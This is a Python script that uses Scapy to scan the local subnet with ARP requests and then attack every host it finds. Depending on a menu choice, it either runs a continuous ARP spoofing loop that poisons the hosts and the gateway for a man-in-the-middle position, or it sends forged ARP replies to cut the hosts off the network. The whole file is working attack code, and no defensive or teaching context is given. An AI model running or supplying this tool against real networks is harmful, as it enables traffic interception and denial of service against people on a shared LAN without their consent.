import time
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp
from scapy.all import conf, send


# ---------------- SCAN LAN ----------------
def GetIpsInLAN():
    iface_ip = conf.route.route("0.0.0.0")[1]
    gateway_ip = conf.route.route("0.0.0.0")[2]

    subnet = iface_ip.rsplit('.', 1)[0] + ".0/24"
    print(f"[+] Scanning subnet: {subnet}")

    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
    answered, _ = srp(arp_request, timeout=3, verbose=False)

    ip_addresses = [recv.psrc for sent, recv in answered]

    if gateway_ip in ip_addresses:
        ip_addresses.remove(gateway_ip)

    return ip_addresses


# ---------------- GET MAC ----------------
def get_mac(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(arp_request, timeout=2, verbose=False)

    for sent, received in answered:
        if received.psrc == ip:
            return received.hwsrc
    return None


# ---------------- ARP SPOOF ----------------
def ARPspoof(ip_addresses):
    gateway_ip = conf.route.route("0.0.0.0")[2]
    TempIpAddresses = ip_addresses.copy()

    while True:
        if not TempIpAddresses:
            TempIpAddresses = ip_addresses.copy()

        target_ip = TempIpAddresses.pop(0)

        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            continue

        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)

        print(f"[+] Spoofing {target_ip}")
        time.sleep(2)


# ---------------- DISCONNECT ----------------
def DisconnectConn(ip_addresses):
    gateway_ip = conf.route.route("0.0.0.0")[2]
    TempIpAddresses = ip_addresses.copy()

    while True:
        if not TempIpAddresses:
            TempIpAddresses = ip_addresses.copy()

        target_ip = TempIpAddresses.pop(0)
        target_mac = get_mac(target_ip)

        if not target_mac:
            continue

        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        print(f"[+] Disconnected {target_ip}")
        time.sleep(2)


# ---------------- MAIN ----------------
if __name__ == "__main__":
    ip_addresses = GetIpsInLAN()
    print("[+] Hosts found:", ip_addresses)

    if not ip_addresses:
        print("[-] No hosts found")
        exit()

    choice = input("Attack? (1 = ARP Spoof | 2 = Disconnect): ")

    if choice == '1':
        ARPspoof(ip_addresses)
    elif choice == '2':
        DisconnectConn(ip_addresses)
